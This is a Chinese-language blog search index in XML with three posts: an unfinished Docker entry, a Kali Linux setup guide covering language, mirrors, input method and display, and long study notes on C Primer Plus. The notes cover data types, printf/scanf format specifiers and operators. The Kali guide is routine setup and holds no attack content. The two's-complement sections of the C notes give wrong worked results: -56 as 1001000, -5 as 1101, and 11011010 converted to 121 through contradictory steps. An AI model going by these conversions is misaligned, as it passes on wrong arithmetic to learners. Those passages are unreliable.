<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Docker知识</title>
    <url>/posts/4126800539/</url>
    <content><![CDATA[施工中
]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>CTF-Web</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali优化</title>
    <url>/posts/1455897523/</url>
    <content><![CDATA[kali解压打开默认密码为：kali
设置中文打开Terminal，输入命令：
sudo dpkg-reconfigure locales

进入后使用键盘的↑+↓←，到最底部，找到 [ ] zh_CN.UTF-8 UTF-8  ，按空格键选中，再按回车进入下一个页面，再选中 zh_CN.UTF-8作为默认语言，后回车
等待下载结束后重启即可  
换源因为官方源都是的速度慢，所以选择换国内源
打开Terminal，输入命令
sudo vim /etc/apt/sources.list

可选的国内源
#阿里云源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.tuna.tsinghua.edu.cn//kali kali-rolling main non-free contrib#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.zju.edu.cn/kali kali-rolling main non-free contrib

不懂vim语法的按以下步骤来

全选删除原本的内容
​	按esc键后，先按 g  g（到达顶部），然后再按 d  G(区分大小写！！！)

复制以上内容，右键粘贴

保存退出
​	按esc键后，同时按住shift键和英文**:**键，再输入wq


系统优化1.设置root账户密码sudo passwd root

2.设置禁止休眠
打开左上角kali图标
点击settings(设置)
点击进入power Manger(电源管理器)
在Power Manager 选择—&gt; display(显示)  把使用电池和插入电源下的依次把Blank after、Put to sleep after和Switch off after 全部设置成为 Never

3.软件数据库更新：apt-get update

4.软件更新：apt-get upgrade

5.系统更新：apt-get dist-upgrade



安装中文输入法
更新包管理器的软件包列表：
sudo apt-get update

安装fcitx输入法框架：
sudo apt-get install fcitx

安装fcitx-googlepinyin谷歌拼音输入法：
sudo apt-get install fcitx-googlepinyin

ctrl+space(空格)切换输入法
界面美化1.整体字体放大
打开左上角kali图标
点击设置进入外观
选择字体，修改DPI

1.桌面图标大小
桌面右键选择桌面设置
选择图标，调节图标大小完成对桌面图标的调节。（这步也可以设置图标下的字体 自定义大小）

2.菜单栏大小以及位置
在菜单栏空白处右键—选择面板再点击面板首选项
打开面板后选择显示—尺寸—调节行大小
关闭锁定面板，可拖动作用两侧的小点将面板放置于最下侧

3.终端字体
打开终端再点击左上角文件点击参数设置
打开设置界面，界面设置—调节字体大小

4.系统字体
打开左上角kali图标
点击设置进入外观
选择字体，修改默认字体和默认等宽字体

4.窗口字体
打开左上角kali图标
点击设置进入窗口管理器
选择样式修改标题字体

]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title>C Primer Plus笔记</title>
    <url>/posts/3276277813/</url>
    <content><![CDATA[C语言概述C程序的基本结构​       程序由一个或多个函数组成，必须有 main()函数。
​        函数由函数头和函数体组成。函数头包括函数名、传入该函数的信息类型和函数的返回类型。通过函数名后的圆括号可识别出函数，圆括号里可能为空，可能有参数。函数体被花括号括起来，由一系列语句、声明组成。
int main(void)  //函数头/* 以下为函数体 */&#123;    int q;  //声明    q = 1;  //语句    printf(&quot;%d is neat.\n&quot;,q);  //语句    return 0;&#125;



多个函数//* two_func.c -- 一个文件中包含两个函数 */#include &lt;stdio.h&gt;void butler(void); /* ANSI/ISO C函数原型 */int main(void)&#123;printf(&quot;I will summon the butler function.\n&quot;);butler();printf(&quot;Yes. Bring me some tea and writeableDVDs.\n&quot;); return 0;&#125;void butler(void) /* 函数定义开始 */&#123;printf(&quot;You rang, sir?\n&quot;);&#125;

该程序的输出如下：
I will summon the butler function.You rang, sir?Yes.Bring me some tea and writeable DVDs.

分析：
​       butler() 函数在程序中出现了3 次。第1 次是函数原型（prototype），告知编译器在程序中要使用该函数；第 2 次以函数调用（function call）的形式出现在 main()中；最后一次出现在函数定义（function definition）中，
butler（）单独不运行的原因：
​        在典型的C程序中，只有main函数会在程序启动时自动执行。其他函数不会在程序启动时自动执行，除非它们被显式地从main函数或其他函数中调用。在您提供的代码示例中，只有main函数会在程序启动时执行，因为它是程序的入口点。其他函数，如butler函数，只有在被调用时才会执行。
关键字与保留标识符​        关键字是C语言的词汇。不能用它们作为标识符（如，变量名）。
​        保留标识符（reserved identifier），C语言已经指定了它们的用途或保留它们的使用权，如果你使用这些标识符来表示其他意思会导致一些问题。保留标识符包括那些以下划线字符开头的标识符和标准库函数名，如printf()。
本章注意点：
标识符名可以用小写字母、大写字母、数字和下划线（_）来命名。而且，名称的第1个字符必须是字符或下划线，不能是数字。
操作系统和C库经常使用以一个或两个下划线字符开始的标识符（如，_kcab），因此最好避免在自己的程序中使用这种名称。
转义序列换行符是一个转义序列（escape sequence）。转义序列用于代表难以表示或无法输入的字符。如，\t代表Tab键，\b代表Backspace键（退格键）。每个转义序列都以反斜杠字符（\）开始。
​        反转义符的使用通常发生在字符串文字（用双引号或单引号括起来的文本）中，以便在其中插入特殊字符或控制字符。所以，一般来说，反转义符需要在字符串文字中使用，不管是在双引号(“”)中还是单引号(‘’)中。
参数中的%d在打印时有什么作用？%d相当于是一个占位符，其作用是指明输出值的位置。
%提醒程序，要在该处打印一个变量，d表明把变量作为十进制整数打印。
printf()函数名中的这个 f表示 “format”（格式），提醒用户这是一种格式化打印函数。

数据与C数据类型关键字


K&amp;R给出的关键字
C90标准添加的关键字
C99标准添加的关键字



int
signed
_Bool


long
void
_Complex


short

_Imaginary


unsigned




char




float




double




注：在C语言中
​        用int关键字来表示基本的整数类型。后3个关键字（long、short和unsigned）和C90新增的signed用于提供基本整数类型的变式，例如unsigned short int和long long int。
​        char关键字用于指定字母和其他字符（如，#、$、%和*）。另外，char类型也可以表示较小的整数。
​        float、double和long double表示带小数点的数。
​        _Bool 类型表示布尔值（ true 或false ） ， _complex 和_Imaginary分别表示复数和虚数。
​        unsigned int或unsigned只用于非负值的场合。这种类型与有符号类型表示的范围不同。用于表示正负号的位现在用于表示另一个二进制位，所以无符号整型可以表示更大的数。例如，16位unsigned int允许的取值范围是0～65535，而不是-32768～32767。
不同数据类型的储存整数的储存整数类型通常以二进制补码形式存储在内存中。补码表示法用于表示正数、负数和零。
以转化-56为例：

确定绝对值的二进制表示：将负数的绝对值转换为正数的二进制表示。
​        首先，找出-56的绝对值，即56，并将其转换为二进制。56的二进制表示为111000。

取反：将这个正数的二进制表示中的每个位都取反，即0变为1，1变为0。
​       现在，将上一步得到的二进制表示中的每一位取反，0变为1，1变为0，得到000111。

加1：接下来，在取反后的二进制数上加1。
​       接下来，在取反后的结果上加1。000111 + 1 &#x3D; 001000。

添加符号位：符号位是二进制表示中的一个特殊位，用于表示一个数的正负。在有符号整数表示法中，符号位通常是最高位（最左边的位），用来表示整数的正负性。
在得到的结果前面添加符号位，因为原数是负数，所以最高位为1。最终的补码表示为1001000&#96;。


整数的最大最小值

C 标准对基本数据类型只规定了允许的最小大小。
对于 16 位机，short 和 int 的最小取值范围是[−32767,32767]；对于32位机，long的最小取值范围是[−2147483647,2147483647]。对于unsigned short和unsigned int，最小取值范围是[0,65535]；对于unsigned long，最小取值范围是[0,4294967295]。long long类型是为了支持64 位的需求， 最小取值范围是[−9223372036854775807,9223372036854775807]；unsigned long long 的最小取值范围是[0,18446744073709551615]

浮点数的储存以IEEE 754标准，32位可以用于表示大约7个有效数字的浮点数，64位可以用于表示大约15到17位的有效数字。
以单精度浮点数（32位）为例：
​        遵循IEEE 754标准，这个标准定义了浮点数的二进制表示方式以及进行浮点数运算的规则。

1位用于表示符号位（正负号），0表示正数，1表示负数。
8位用于表示指数部分（exponent）。
剩下的23位用于表示尾数部分（mantissa）。

以转化42.625为例

将整数部分转换为二进制：
将整数部分42转换为二进制，得到101010。

将小数部分转换为二进制：
将小数部分0.625转换为二进制。通常，可以将小数部分乘以2并取整数部分，然后将余数作为下一位的小数部分，一直重复直到小数部分为0或者达到所需的精度。对于0.625，这个过程如下：

0.625 * 2 &#x3D; 1.25，整数部分是1，小数部分更新为0.25。
0.25 * 2 &#x3D; 0.5，整数部分是0，小数部分更新为0.5。
0.5 * 2 &#x3D; 1.0，整数部分是1，小数部分更新为0.0。

因此，0.625的二进制表示为0.101。

将整数部分和小数部分组合：
将整数部分101010和小数部分0.101组合在一起，得到二进制表示101010.101。

规范化：
在IEEE 754中，浮点数采用科学计数法表示，其中二进制小数点位于左边的第一个非零位前面。因此，需要将二进制数规范化，将小数点移到合适的位置。在这种情况下，将小数点移到最左边，得到规范化的二进制表示为1.01010101 x 2^5。

确定指数和尾数：

指数：因为小数点向左移了5位，所以指数为5。在IEEE 754中，还需要加上一个偏移值（127），因此指数为5 + 127 &#x3D; 132。以8位表示指数，二进制为10000100。
尾数：小数点左边的部分是尾数，即01010101。


组合符号、指数和尾数：

符号位：因为42.625是正数，所以符号位为0。
指数：上面计算得到的8位指数为10000100。
尾数：上面计算得到的尾数为01010101。



最终，将这些组合在一起得到32位的浮点数表示为：0 10000100 01010101000000000000000
这就是42.625的单精度浮点数表示，其中第一个位是符号位，接下来的8位是指数，剩下的23位是尾数。这个二进制表示可以转换为十进制浮点数为42.625。
注：
偏移值的作用：使次方数换算为二进制时不出现小数点
偏移值的确定即确定最小次方数：（以32位为例）
​        32位精度有8位二进制用来表示次方数，故次方的范围数位(2**8 -1)即255。0占去1位，剩下正负进行平分，故最小的次方数位-127，故偏移值为127，加上偏移值后次方数不存在负数的情况
因使用过二进制的科学计数法，小数点前一定为1，故尾数部分只取小数点后的一部分
进制进制书面表示
1011B表示二进制1011，也记作（1011）2
1357O(字母O)表示八进制1357，也记为（1357）8
2049D表示为十进制2049，也记作（2049）10
3FB9H表示十六进制数3FB9，也记作（3FB9）16

初始化变量时的进制表示
加0b或者0B表示二进制
加0表示八进制
加0x或0X表示16进制
不加默认表示10进制

可在整数输入的数值后添加L/l表示此整数以32位进制运算，如
int a = 7L

可在浮点数后输入f表示此浮点数以32位float进行运算（默认为64位double进行运算），以便提高运算效率，如
float a = 7.0f



输出中的进制表示
%d/%i表示有符号十进制输出
%x或%X表示以十六进制输出
%o表示以八进制输出
%f表示输出单精度浮点数
%ld表示输出长整型十进制整数
%lo表示输出长整型八进制整数
%lx表示输出长整型十六进制整数
%lf表示输出双精度浮点数
%c格式对应的是单个字符
%s格式对应的是字符串
%hd表示输出short类型的十进制整数
%ho表示输出short类型的八进制整数
%hx表示输出short类型的十六进制整数
%lld表示输出long long int整数
%llx表示输出long long int十六进制整数
%llo表示输出long long int八进制整数
%llu表示输出long long unsigned整数
%u表示输出无符号整数
%e/%E表示输出以指数计数法的浮点数
%le/%E表示输出以指数计数法的长浮点数
%a/%A表示输出以十六进制指数计数法的浮点数
%%表示输出百分号
%p（在不支持%p的编译器中%u 或%lu 代替%p）表示指针
%g/%G自动选择以%f或%e输出
%zd作为函数sizeof()的输出

注：

unsigned 修饰符不能用于浮点数类型。它只能用于整数数据类型

默认八进制和十六进制都是整数类型数值

输出时，如果要在八进制和十六进制值前显示0和0x前缀，要分别在转换说明中加入#（即在%后加入#）

%1f表示输出浮点数并保留小数点后一位

%1.2f表示输出浮点数且小数点前至少一字节（不足空格补足）并保留两位小数

%d可用于输出char类型的变量，但不能用于scanf()赋值


进制的转化（1）–负数十进制转二进制（十进制为负数）当将负数从十进制转换为二进制时，通常会使用二进制补码表示法。这是因为在计算机内部，负数通常以二进制补码的形式存储。下面是将负数转换为二进制的一般过程：

确定负数的绝对值：首先，确定负数的绝对值。例如，如果要将-5转换为二进制，绝对值是5。

将绝对值转换为二进制：将绝对值转换为二进制的标准方法是使用除2取余法（或称为短除法）：

不断将绝对值除以2，同时记录每一步的余数。
将余数以逆序的方式排列，就得到了二进制表示。例如，对于绝对值5，过程如下：
5 ÷ 2 &#x3D; 2 余 1
2 ÷ 2 &#x3D; 1 余 0
1 ÷ 2 &#x3D; 0 余 1


然后，将这些余数逆序排列，得到二进制数101。


将二进制数取反：在二进制补码中，正数的补码和原码相同，但负数的补码需要将其绝对值的二进制数取反，即0变为1，1变为0。在上面的例子中，二进制数101取反后变为010。

将取反后的结果加1：最后一步是将取反后的结果加1。在上面的例子中，010 + 1 &#x3D; 011。

加上符号位：最终，加上符号位。在二进制补码中，符号位是最左边的位，0表示正数，1表示负数。在上面的例子中，要表示-5，将最左边的位设置为1，得到最终结果1101。


所以，将负数-5转换为二进制补码的结果是1101。这个过程可以用于将任何负数转换为二进制补码。请注意，不同的编程语言可能有不同的方式来表示二进制补码，但这个过程是通用的。
二进制转十进制（符号位为1）
找到符号位：首先，从二进制表示中找到符号位。在二进制补码中，符号位是最左边的位，1表示负数，0表示正数。

取反：将除符号位以外的所有位取反，即0变为1，1变为0。这是为了得到负数的绝对值的二进制表示。

加1：对取反后的结果加1，以得到负数的绝对值的二进制补码表示。

计算绝对值的十进制：将上一步得到的二进制数转换为十进制。这是标准的二进制到十进制转换。从最右边的位（最低位）开始，将每个位的值乘以2的幂，然后相加，直到处理完所有位。

加上负号：根据最初的符号位，将正数的绝对值前面添加负号。


让我们以一个例子来说明这个过程。假设我们有一个8位的二进制补码：11011010。

找到符号位：符号位是最左边的位，1表示负数。
取反：去除符号位并将其余位取反，得到00100110。
加1：对取反后的结果加1，得到00100111。
计算绝对值的十进制：将00100111转换为十进制。从右到左，第1位是1，第2位是2，第3位是4，第4位是0，第5位是0，第6位是0，第7位是0，第8位是-128（因为符号位是1）。计算总和：1 + 2 + 4 + 0 + 0 + 0 + 0 + (-128) &#x3D; -121。
加上负号：最初的符号位是1，所以最终结果是-(-121)，即121。

因此，二进制补码11011010对应的十进制值是121。这个过程可以用于将任何负数的二进制补码表示转换为十进制。
进制的转换（2）-正数​     正数的转化无需像负数-取反、加一，直接将除符号位的二进制转化为十进制即可
数值溢出整数程序实例
/*（printf()函数使用%u说明显示unsigned int类型的值）。*//* toobig.c-- 超出系统允许的最大int值*/#include &lt;stdio.h&gt;int main(void)&#123;	int i = -2147483648;	int k = 2147483647;	unsigned int j = 4294967295;	printf(&quot;%d %d %d\n&quot;, i, i - 1, i - 2);	printf(&quot;%d %d %d\n&quot;, k, k + 1, k + 2);	printf(&quot;%u %u %u\n&quot;, j, j + 1, j + 2);	return 0;&#125;

运行结果
-2147483648 2147483647 21474836462147483647 -2147483648 -21474836474294967295 0 1

分析：
可以把无符号整数j看作是汽车的里程表。当达到它能表示的最大值时，会重新从起始点开始。整数 i 也是类似的情况。它们主要的区别是，在超过最大值时，unsigned int 类型的变量 j 从 0开始；而int类型的变量i则从−2147483648（从绝对值最大）开始。
浮点值的上溢和下溢上溢：
​      当计算导致数字过大，超过当前类型能表达的范围时，就会发生上溢。在这种情况下会给toobig赋一个表示无穷大的特定值，而且printf()显示该值为inf或infinity（或者具有无穷含义的其他内容）。
下溢：
​      当出现下溢的时候，计算机只好把尾数部分的位向右移，空出第 1 个二进制位，并丢弃最后一个二进制数。以十进制为例，把一个有4位有效数字的数（如，0.1234E-10）除以10，得到的结果是0.0123E-10。虽然得到了结果，但是在计算过程中却损失了原末尾有效位上的数字。
C语言把损失了类型全精度的浮点值称为低于正常的（subnormal）浮点值。。现在，C库已提供了用于检查计算是否会产生低于正常值的函数。
字符char类型用于储存字符（如，字母或标点符号），但是从技术层面看，char是整数类型。
在C 语言中， 用单引号（&#39; &#39;）括起来的单个字符被称为字符常量。编译器一发现&#39;A&#39;，就会将其转换成相应的代码值。
非打印字符见C Primer Plus 140-144
有些ASCII字符打印不出来。例如，一些代表行为的字符（如，退格、换行、终端响铃或蜂鸣）
以下有两种方法
方法一：使用ASCII码
例如，蜂鸣字符的ASCII值是7，因此可以这样写：
char beep = 7

方法二：使用转义符
转义序列赋给字符变量时，必须用单引号把转义序列括起来。例如，假设有下面一行代码：
char nerf = &#x27;\n&#x27;;




转义序列
含义
转移符号
含义



\a
警报
\v
垂直制表符


\b
退格
\\
反斜杠


\f
换页
\&#39;
单引号


\n
换行
\&quot;
双引号


\r
回车
\?
问号


\t
水平制表符
\xhhh
十六进制值 (hhh 是1～3位十六进制数字，即每个h可表示 0~f中的一个数，)


\000
八进制值 (oo 必须是有效的八进制数，即每个o可表示 0~7中的一个数，可省略数字前多余的0默认也为8进制，但为了防止出问题建议补全为3位)
\+任意符号
输出对应符号


对于\0oo和\xhh，等同于使用ASCII的十进制对应数据效果
何时使用ASCII码？何时使用转义序列？如果要在转义序列（假设使用&#39;\f&#39;）和ASCII码（’\014‘）之间选择，请选择前者（即’\f‘）。这样的写法不仅更好记，而且可移植性更高。’\f’在不使用ASCII码的系统中，仍然有效。
本章注意点：
变量初始化需要每个值进行初始化，否则会造成错误
getchar()函数的使用实例
/* platinum.c -- your weight in platinum */#include &lt;stdio.h&gt;int main(void)&#123;float weight; /* 你的体重 */float value; /* 相等重量的白金价值 */printf(&quot;Are you worth your weight in platinum?\n&quot;);printf(&quot;Let&#x27;s check it out.\n&quot;);printf(&quot;Please enter your weight in pounds: &quot;);/* 获取用户的输入 */scanf(&quot;%f&quot;, &amp;weight);/* 假设白金的价格是每盎司$1700 *//* 14.5833用于把英镑常衡盎司转换为金衡盎司[1]*/value = 1700.0 * weight * 14.5833;printf(&quot;Your weight in platinum is worth $%.2f.\n&quot;, value);printf(&quot;You are easily worth that! If platinum prices drop,\n&quot;); printf(&quot;eat more to maintain your value.\n&quot;);return 0;&#125;

程序的输出在屏幕上一闪而过，此时可使用，在程序中添加下面一行代码：
getchar();

但程序的输出依旧在屏幕上一闪而过，本例，需要调用两次getchar()函数：
getchar();getchar();



分析：
​        在这种情况下，键入 156 并按下Enter键（发送一个换行符），然后scanf()读取键入的数字，第1个getchar()读取换行符，第2个getchar()让程序暂停，等待输入。
原因：
​        在你输入自己的数值后按下回车，scanf函数读取用户输入的体重值时，回车键会被当作输入的一部分，并被存储在输入缓冲区中。scanf函数会读取用户输入的数值，但回车键仍然留在缓冲区中，并且getchar()函数会获取回车键字符。
声明变量的作用​       声明为变量创建和标记存储空间
数据类型应与打印类型一致实例：
/* print2.c--更多printf()的特性 */#include &lt;stdio.h&gt;int main(void)&#123;unsigned int un = 3000000000; /* int为32位和short为16位的系统 */short end = 200;long big = 65537;long long verybig = 12345678908642;printf(&quot;un = %u and not %d\n&quot;, un, un);printf(&quot;end = %hd and %d\n&quot;, end, end);printf(&quot;big = %ld and not %hd\n&quot;, big, big);printf(&quot;verybig= %lld and not %ld\n&quot;, verybig, verybig);return 0;&#125;

输出结果：
un = 3000000000 and not -1294967296end = 200 and 200big = 65537 and not 1verybig= 12345678908642 and not 1942899938

该例表明，使用错误的转换说明会得到意想不到的结果。
原因：
情况一：例如第一行输出
内存中的数位相同：不同数据类型中不同的位数所表示含义不一样，造成输出错误，也如：long long int 和double这两个数据类型
情况二：例如第三、四行输出
不同的修饰符可以截断成不同类型值，printf（）从二进制的后往前读取位数
把 65537 以二进制格式写成一个 32 位数是00000000000000010000000000000001。使用%hd， printf()只会查看后 16 位，所以显示的值是 1。与此类似，输出的最后一行先显示了verybig的完整值，然后由于使用了%ld，printf()只显示了储存在后32位的值。
注意：
在使用 printf()函数时，切记检查每个待打印值都有对应的转换说明，还要检查转换说明的类型是否与待打印值的类型相匹配。
断行输入​    只要不在引号内部或一个单词中间断行，就可以被分为两行
sizeof()函数sizeof是C语言的内置运算符，以字节为单位给出指定类型的大小。C99和C11提供%zd转换说明匹配sizeof的返回类型。一些不支持C99和C11的编译器可用%u或%lu代替%zd。
printf(&quot;Type int has a size of %zd bytes.\n&quot;, sizeof(int));printf(&quot;type int has a size of %u bytes.\n&quot;, sizeof(int));printf(&quot;type int has a size of %lu bytes.\n&quot;, sizeof(int));



输入的数据类型与设定数据类型不一致的情况把一个类型的数值初始化给不同类型的变量时，编译器会把值转换成与变量匹配的类型，这将导致部分数据丢失。
例如
int cost = 12.99; /* 用double类型的值初始化int类型的变量 */float pi = 3.1415926536; /* 用double类型的值初始化float类型的变量 */

第1个声明，cost的值是12。C编译器把浮点数转换成整数时，会直接丢弃（截断）小数部分，而不进行四舍五入。第2个声明会损失一些精度，因为C只保证了float类型前6位的精度。

字符串和格式化字符串与char数组字符串（character string）是一个或多个字符的序列，双引号不是字符串的一部分。双引号仅告知编译器它括起来的是字符串，正如单引号用于标识单个字符一样。
C语言没有专门用于储存字符串的变量类型，字符串都被储存在char类型的数组（数组是同类型数据元素的有序序列）中。数组由连续的存储单元组成，字符串中的字符被储存在相邻的存储单元中
数组末尾位置的字符\0 。这是空字符（ null character），C语言用它标记字符串的结束。空字符不是数字0，它是非打印字符。C中的字符串一定以空字符结束，这意味着数组的容量必须至少比待存储字符串中的字符数多1。
常量和C预处理器假设程序中的多处使用一个常量，有时需要改变它的值。毕竟，税率通常是浮动的。如果程序使用符号常量，则只需更改符号。常量的定义，不用在程序中查找使用常量的地方，然后逐一修改。C语言还提供了一个更好的方案——C预处理器。只需在程序顶部添加下面一行：
#define TAXRATE 0.015

用大写表示符号常量是 C 语言一贯的传统。这样，在程序中看到全大写的名称就立刻明白这是一个符号常量，而非变量。
C头文件limits.h和float.h分别提供了与整数类型和浮点类型大小限制相关的详细信息。
如果在程序中包含limits.h头文件，就可编写下面的代码：
printf(&quot;Maximum int value on this system = %d\n&quot;,INT_MAX);

limits.h中的一些明示常量

float.h中的一些明示常量

strlen()函数strlen()函数给出字符串中的字符长度
输出时可以使用%zd，在早期版本中换成%u或%lu
printf()的转化说明修饰符


修饰符
含义



标记
表4.5描述了5种标记(-、+、空格、#和0)，可以不使用标记或使用多个标记(不会对输出结果造成影响)-表示输出时采用左对齐。 +这表示要输出的整数值为正数时，要在其前面显示加号（+），而负数仍然会显示减号（-）空格：有符号值若为正，则在值前面显示前导空格(不显示任何符号); 若为负，则在值前面显示减号+标记覆盖一个空格#:把结果转换为另一种形式。如果是%o 格式，则以0开始:如果是%X或格式，则以0X或0X开始:对于所有的浮点格式，#保证了即使后面没有任何数字，也打印一个小数点字符。对于%g 和%G格式，#防止结果后面的0被删除通常情况下，整数会用空格来填充以满足指定的宽度，但使用0可以指示用零字符来填充。（用于右对齐的情况）示例:”%-10d“


数字
最小字段宽度如果该字段不能容纳待打印的数字或字符串，系统会使用更宽的字段示例:”%4d“


.数字
对于%e、%E 和%f 转换，表示小数点右边数字的位数对于%q和%G转换，表示有效数字最大位数对于%s转换，表示待打印字符的最大数量对于整型转换，表示待打印数字的最小位数如有必要，使用前%0来达到这个位数只使用.表示其后跟随一个0，所以%.f和%.0f相同示例:&quot;%5.2f&quot;打印一个浮点数，字段宽度为5字符，其中小数点后有两位数字


h
和整型转换说明一起使用，表示short int或unsigned short int类型的值示例:&quot;%hu&quot;、&quot;%hx&quot;、&quot;%6.4hd&quot;


hh
和整型转换说明一起使用，表示signed char或unsigned char类型的值示例:“%hhu“、”%hhx“、”%6.4hhd“


j
和整型转换说明一起使用，表示intmax_t或uintmax_t类型的值。这些类型定义在stdint.h中示例:”%jd”、”%8jx“


l
和整型转换说明一起使用，表示long int或unsignedlongint类型的值示例:”&amp;ld”、”%8lu”


ll
和整型转换说明一起使用，表示long long int或unsigned long long int类型的值(C99)示例:”%lld“、”%81lu“


L
和浮点转换说明一起使用，表示long double类型的值示例:”%Ld“、”%10.4Le“


t
和整型转换说明一起使用，表示ptrdiff_t类型的值。ptrdiff_t是两个指针差值的类型(C99)示例:”%td“、”%12ti“


z
和整型转换说明一起使用，表示size_t类型的值。size_t是sizeof返回的类型(C99)示例:”%zd“、”%12zd“


注：printf()中*的使用
printf(&quot;Weight = %*.*f\n&quot;, width, precision, weight);

可以代表此处的数值由后面的变量进行决定，如此处的字符宽度由width进行决定，保留小数位数由precision进行决定
scanf（）读取字符串的规则​	scanf()在读取输入时就已完成把空字符放入字符串末尾这项工作.它在遇到第1个空白（空格、制表符或换行符）时就不再读取输入。
&amp;的使用​	如果用scanf()读取基本变量类型的值，在变量名前加上一个&amp;；​	如果用scanf()把字符串读入字符数组中，不要使用&amp;。
scanf()的读取规则每次读取一个字符，跳过所有的空白字符，直至遇到第1个非空白字符才开始读取
scanf()不断地读取和保存字符，直至遇到非数字字符。
然后scanf()把非数字字符放回输入。这意味着程序在下一次读取输入时，首先读到的是上一次读取丢弃的非数字字符。
如果第1个非空白字符是A而不是数字，scanf()将停在那里，并把A放回输入中，不会把值赋给指定变量。程序在下一次读取输入时，首先读到的字符是A。如果程序只使用%d转换说明，scanf()就一直无法越过A读下一个字符。
scanf()中的使用规则scanf(&quot;%*d %*d %d&quot;, &amp;n);

使用*可以使scanf()跳过前两个函数的赋值,在上述代码中跳过两个整数，把第3个整数拷贝给n
返回值scanf()函数返回读取数据的数量，所以如果读取对应类型则返回1，如果读取不成功则不返回0，在转换值之前出现问题，会返回一个特殊值EOF（通常被定义为-1）。
读取小数值由于输入的小数在c语言中默认作为double进行处理，所以对应的数据类型需要使用&amp;lf，否则会出错。
本章注意点：
&quot;X&quot;与&#39;X&#39;的区别区别之一在于’x’是基本类型（char），而”x”是派生类型（char数组）
区别之二是”x”实际上由两个字符组成：’x’和空字符\0
sizeof 何时使用了圆括号圆括号的使用时机否取决于运算对象是类型还是特定量。运算对象是类型时，圆括号必不可少，但是对于特定量，可有可无。也就是说，对于类型，应写成sizeof(char)或sizeof(float)；对于特定量，可写成sizeof name或sizeof 6.28。尽管如此，还是建议所有情况下都使用圆括号，如sizeof(6.28)
const限定符C90标准新增了const关键字，用于限定一个变量为只读.这使得成为一个只读值，可以在计算中使用， 可以打印， 但是不能更改值。

运算符、表达式和语句运算符基本运算符=、+、-、*、/
注：C 没有指数运算符。不过，C 的标准数学库提供了一个pow()函数用于指数运算。例如，pow(3.5, 2.2)返回3.5的2.2次幂。
赋值运算符&#x3D;并不意味着“相等”，而是一个赋值运算符。赋值行为从右往左进行。
bmw = 2002;

读作“把值2002赋给变量bmw”
求模运算符-%用于整数运算，求模运算符给出其左侧整数除以右侧整数的余数
一元运算符与二元运算符一元运算符：只有一个运算对象，如：-16
二元运算符：有两个运算对象，如：23-14
递增递减运算符递增运算符：++
递增运算符执行简单的任务，将其运算对象递增1。
递减运算符：--
++的前缀形式和后缀形式的区别
int a = 1，int b， c；b = a++c = ++a

在最后的输出结果中会发现，b&#x3D;1而c&#x3D;3；这因为后缀在运算过程中在a使用完成后再进行递增，而前缀先进行递增而后进行计算。
结合优先级
只有圆括号的优先级比递增递减运算符高。因此， x*y++ 表示的是(x)*(y++) ， 而不是(x+y)++。不过后者无效，因为递增和递减运算符只能影响一个变量（或者，更普遍地说，只能影响一个可修改的左值），而组合x*y本身不是可修改的左值。
关系运算符


运算符
含义



&lt;
小于


&gt;
大于


&lt;&#x3D;
小于或等于


&gt;&#x3D;
大于或等于


&#x3D;&#x3D;
等于


!&#x3D;
不等于


注：
可以通过关系运算符判断字符，但不能判断字符串
int a;char ch;a = (ch != &#x27;s&#x27;)//根据ASCII区分大小写



通过关系运算符可以比较浮点数，但最好使用&lt;、&gt;进行判断，因为浮点数在储存时会造成舍入误差造成原本相等的两数不相等。可使用fabs()函数-返回绝对值来进行比较浮点数
#include &lt;math.h&gt;//fabs()函数所需的头文件#include &lt;stdio.h&gt;int main(void)&#123;const double ANSWER = 3.14159;double response;printf(&quot;What is the value of pi?\n&quot;);scanf(&quot;%lf&quot;, &amp;response);while (fabs(response - ANSWER) &gt; 0.0001)//浮点数两数相等所自定义的允许误差&#123;printf(&quot;Try again!\n&quot;);scanf(&quot;%lf&quot;, &amp;response);&#125;printf(&quot;Close enough!\n&quot;);return 0;&#125;



逗号运算符逗号运算符扩展了for循环的灵活性，以便在循环头中包含更多的表达式
逗号运算符并不局限于在for循环中使用，但是这是它最常用的地方。逗号运算符有两个其他性质。首先，它保证了被它分隔的表达式从左往右求值。(但逗号运算符无法在计算中插入使用以改变计算顺序，如：b = 3 * 5 - 10, * 2 + 15是错误的写法)
假设在写数字时不小心输入了逗号：
houseprice = 249,500;

这不是语法错误，C 编译器会将其解释为一个逗号表达式，即houseprice = 249 是逗号左侧的子表达式，500; 是右侧的子表达式。
逗号也可用作分隔符。
逗号运算符会依次计算每个表达式，并返回最后一个表达式的值作为整个逗号运算符表达式的值。
逻辑运算符


逻辑运算符
含义



&amp;&amp;
与


||
或


!
非


备选拼写：iso646.h头文件C99标准新增了可代替逻辑运算符的拼写，它们被定义在ios646.h头文件中。如果在程序中包含该头文件，便可用and代替&amp;&amp;、or代替||、not代替!。
判断范围问题&amp;&amp;运算符可用于测试范围。例如，要测试score是否在90～100的范围内，可以这样写：
if (range &gt;= 90 &amp;&amp; range &lt;= 100)printf(&quot;Good show!\n&quot;);

千万不要模仿数学上的写法：
if (90 &lt;= range &lt;= 100) // 千万不要这样写！printf(&quot;Good show!\n&quot;);/*由于&lt;=运算符的求值顺序是从左往右，所以编译器把测试表达式解释为：(90 &lt;= range) &lt;= 100*/

子表达式90 &lt;&#x3D; range的值要么是1（为真），要么是0（为假）。这两个值都小于100，所以不管range的值是多少，整个表达式都恒为真。因此，**在范围测试中要使用&amp;&amp;**。
条件运算符——?:以下述代码为例
max = (a &gt; b) ? a : b;

上述语句翻译为：如果a大于b，那么将max设置为a；否则，设置为b。
&amp;运算符-查找地址一元&amp;运算符给出变量的存储地址。PC地址通常用十六进制形式表示
%p是输出地址的转换说明
间接运算符-*间接运算符* ，该运算符有时也称为解引用运算符。*用于给出储存在指针指向地址上的值。
ptr = &amp;bah;val = *ptr; // 找出ptr指向的值

以上代码相当于如下代码
val = bah;



